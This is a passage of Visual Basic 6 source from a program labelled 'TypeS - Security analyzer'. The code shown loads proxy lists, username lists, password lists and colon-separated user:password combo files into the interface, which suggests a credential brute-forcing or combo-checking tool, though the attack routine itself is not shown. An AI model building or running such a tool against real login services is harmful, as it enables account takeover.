            StatusBar1.Panels(1).Text = "Done. " & lvProxy.ListItems.Count & " proxies loaded!"
            pb1.Value = 0
        
        Case "HTTP"
            frmHTTP.Show 1
            
        Case "Stop"
            If MsgBox("Are you sure?", vbQuestion + vbYesNo) = vbYes Then
                stopSession = True
                frmWait.Show 1
            End If
        
        Case "tray"
            frmMain.Hide
            Tray1.ToolTipText = "TypeS - Security analyzer"
            Tray1.AddTrayIcon App.Path & "\TYpeS.ico"
            
        Case "pass"
            cd1.DialogTitle = "Select password file..."
            cd1.Filter = "Text Files (*.txt)|*.txt|All Files(*.*)|*.*|"
            cd1.ShowOpen
            
            If Len(cd1.FileName) = 0 Then Exit Sub
               
            iCOunt = 0
            fnum = FreeFile
            lstPasses.Visible = False
            pb1.Visible = True
            
            Screen.MousePointer = 11
            Open cd1.FileName For Input As #fnum
                
                pb1.Max = LOF(fnum)
                While Not EOF(fnum)
                    pb1.Value = Seek(fnum) + 1
                    Line Input #fnum, strTemp
                    
                    ReDim Preserve strPass(iCOunt)
                    strPass(iCOunt) = Trim(strTemp)
                    
                    lstPasses.AddItem Trim(strTemp)
                    
                    iCOunt = iCOunt + 1
                    DoEvents
                Wend
                
            Close #fnum
            Screen.MousePointer = 1
            pb1.Value = 0
            lstPasses.Visible = True
            StatusBar1.SimpleText = iCOunt & " password's loaded!"
            Frame3.Caption = "Password: " & iCOunt
            pb1.Visible = False

        Case "user"
            cd1.DialogTitle = "Select username file..."
            cd1.Filter = "Text Files (*.txt)|*.txt|All Files(*.*)|*.*|"
            cd1.ShowOpen
            
            If Len(cd1.FileName) = 0 Then Exit Sub
               
            iCOunt = 0
            fnum = FreeFile
            lstUsers.Visible = False
            pb1.Visible = True
            
            Screen.MousePointer = 11
            Open cd1.FileName For Input As #fnum
                
                pb1.Max = LOF(fnum)
                While Not EOF(fnum)
                    pb1.Value = Seek(fnum) + 1
                    Line Input #fnum, strTemp
                    
                    ReDim Preserve strUser(iCOunt)
                    strUser(iCOunt) = Trim(strTemp)
                    
                    lstUsers.AddItem Trim(strTemp)
                    
                    iCOunt = iCOunt + 1
                    DoEvents
                Wend
                
            Close #fnum
            Screen.MousePointer = 1
            pb1.Value = 0
            lstUsers.Visible = True
            StatusBar1.SimpleText = iCOunt & " username's loaded!"
            Frame2.Caption = "Username: " & iCOunt
            pb1.Visible = False
            
        Case "combo"
            cd1.DialogTitle = "Select combo file..."
            cd1.Filter = "Text Files (*.txt)|*.txt|All Files(*.*)|*.*|"
            cd1.ShowOpen
            
            If Len(cd1.FileName) = 0 Then Exit Sub
            
            iCOunt = 0
            fnum = FreeFile
            lstPasses.Visible = False
            lstUsers.Visible = False
            pb1.Visible = True
            
            Screen.MousePointer = 11
            Open cd1.FileName For Input As #fnum
                
                pb1.Max = LOF(fnum)
                While Not EOF(fnum)
                    pb1.Value = Seek(fnum) + 1
                    Line Input #fnum, strTemp
                    varAuth = Split(strTemp, ":")
                    
                    ReDim Preserve strUser(iCOunt)
                    strUser(iCOunt) = Trim(varAuth(0))
                    lstUsers.AddItem Trim(varAuth(0))
                    
                    ReDim Preserve strPass(iCOunt)
                    strPass(iCOunt) = Trim(varAuth(1))
                    lstPasses.AddItem Trim(varAuth(1))
                    
                    iCOunt = iCOunt + 1
                    DoEvents
                Wend
                
            Close #fnum
            Screen.MousePointer = 1
            pb1.Value = 0
            pb1.Visible = False
            lstPasses.Visible = True
            lstUsers.Visible = True
            
            StatusBar1.SimpleText = iCOunt & " username's/password's loaded!"
            Frame2.Caption = "Username: " & iCOunt
            Frame3.Caption = "Password: " & iCOunt
    
    End Select

End Sub


Private Sub Tray1_MouseClick(ByVal FBButton As TrayIcon.EnumFBButtonConstants)

  Select Case FBButton
    
    Case EnumFBButtonConstants.FB_RIGHT_BUTTON_UP
      PopupMenu mnuFile

    Case Else

  End Select

End Sub
